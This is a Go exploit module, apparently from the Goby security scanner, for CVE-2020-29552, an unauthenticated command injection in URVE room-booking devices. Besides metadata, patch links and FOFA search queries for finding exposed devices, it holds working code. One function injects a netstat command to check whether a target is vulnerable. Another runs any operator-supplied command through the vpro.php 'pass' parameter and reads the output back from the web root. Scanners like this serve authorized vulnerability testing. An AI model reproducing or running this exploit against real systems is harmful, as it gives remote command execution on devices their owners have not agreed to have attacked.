package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "URVE 2020.03.24 RCE (CVE-2020-29552)",
    "Description": "An issue was discovered in URVE Build 24.03.2020. By using the _internal/pc/vpro.php?mac=0&amp;ip=0&amp;operation=0&amp;usr=0&amp;pass=0%3bpowershell+-c+\" substring, it is possible to execute a Powershell command and redirect its output to a file under the web root.",
    "Impact": "URVE 2020.03.24 RCE (CVE-2020-29552)",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-040.txt\">https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-040.txt</a></p>",
    "Product": "URVE",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Urve 操作系统 vpro.php 文件 pass 参数命令注入漏洞（CVE-2020-29552）",
            "Description": "<p>Urve是英国Urve公司的一个用于预约会议室/客房的设备。该设备可支持与MS Exchange，Lotus，Office 365，Google日历和其他系统的集成用于支持会议室、客房的预定。</p><p>Urve Build 24.03.2020 存在操作系统命令注入漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>Urve Build 24.03.2020 存在操作系统命令注入漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-040.txt \" target=\"_blank\">https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-040.txt</a><br></p>",
            "Product": "URVE",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "URVE 2020.03.24 RCE (CVE-2020-29552)",
            "Description": "An issue was discovered in URVE Build 24.03.2020. By using the _internal/pc/vpro.php?mac=0&ip=0&operation=0&usr=0&pass=0%3bpowershell+-c+\" substring, it is possible to execute a Powershell command and redirect its output to a file under the web root.",
            "Impact": "URVE 2020.03.24 RCE (CVE-2020-29552)",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-040.txt \" target=\"_blank\">https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-040.txt</a><br></p>",
            "Product": "URVE",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"URVE\"",
    "GobyQuery": "body=\"URVE\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://eveo.pl/",
    "DisclosureDate": "2020-12-23",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2020-29552"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2020-29552"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202012-1513"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "URVE"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := `/_internal/pc/vpro.php?mac=0&ip=0&operation=0&usr=0&pass=0%3bcmd+/c+"netstat+>+C%3a\URVE\Profiles\urve\uploads\out`
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "request sent") {
					uri_2 := "/urve/uploads/out"
					cfg_2 := httpclient.NewGetRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					if resp_2, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
						hexBody := hex.EncodeToString([]byte(resp_2.RawBody))
						reHexBody := strings.ReplaceAll(strings.TrimLeft(hexBody, "fffe"), "00", "")
						body, _ := hex.DecodeString(reHexBody)
						return resp_2.StatusCode == 200 && strings.Contains(string(body), "ESTABLISHED")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			payload := ss.Params["cmd"].(string)
			uri := fmt.Sprintf(`/_internal/pc/vpro.php?mac=0&ip=0&operation=0&usr=0&pass=0;%%3bcmd+/c+"%s+>+C%%3a\URVE\Profiles\urve\uploads\out`, url.QueryEscape(payload))
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "request sent") {
					uri_2 := "/urve/uploads/out"
					cfg_2 := httpclient.NewGetRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					if resp_2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
						hexBody := hex.EncodeToString([]byte(resp_2.RawBody))
						reHexBody := strings.ReplaceAll(strings.TrimLeft(hexBody, "fffe"), "00", "")
						body, _ := hex.DecodeString(reHexBody)
						expResult.Output = string(body)
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
